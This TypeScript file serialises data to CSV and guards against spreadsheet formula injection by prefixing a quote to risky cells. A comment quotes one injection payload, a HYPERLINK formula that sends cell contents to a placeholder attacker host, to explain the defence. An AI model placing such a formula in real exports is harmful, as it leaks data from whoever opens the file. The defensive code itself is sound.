/** RFC 4180 CSV serialisation with spreadsheet-injection hardening. */

const NEEDS_QUOTING = /[",\r\n]/;

/**
 * Excel, Sheets and LibreOffice evaluate any cell whose text begins with
 * `=`, `+`, `-`, `@`, or a leading tab/CR as a formula. A transaction
 * description such as `=HYPERLINK("http://evil.tld?d="&A1,"Click")` would then
 * run on the machine of whoever opens the export.
 *
 * Prefixing a single quote neutralises the cell while still displaying the
 * original text, which is the remedy OWASP recommends.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

export function csvCell(value: unknown): string {
  if (value === null || value === undefined) return "";

  // Numbers and booleans cannot carry a formula, so they skip the guard and
  // stay numeric in the spreadsheet.
  if (typeof value === "number" || typeof value === "boolean") {
    return String(value);
  }

  const text = neutralizeFormula(String(value));

  return NEEDS_QUOTING.test(text) ? `"${text.replace(/"/g, '""')}"` : text;
}

export function toCsv<T>(
  rows: readonly T[],
  columns: readonly { header: string; value: (row: T) => unknown }[],
): string {
  const lines = [columns.map((column) => csvCell(column.header)).join(",")];

  for (const row of rows) {
    lines.push(columns.map((column) => csvCell(column.value(row))).join(","));
  }

  // CRLF line endings, per RFC 4180, keep Excel on Windows happy.
  return lines.join("\r\n");
}

/**
 * A UTF-8 byte order mark. Without it Excel decodes the file as the local
 * ANSI codepage and mangles every non-ASCII character - currency symbols and
 * accented category names included.
 */
export const UTF8_BOM = "\uFEFF";

export function csvFilename(prefix: string): string {
  const stamp = new Date().toISOString().slice(0, 10);
  return `${prefix}-${stamp}.csv`;
}
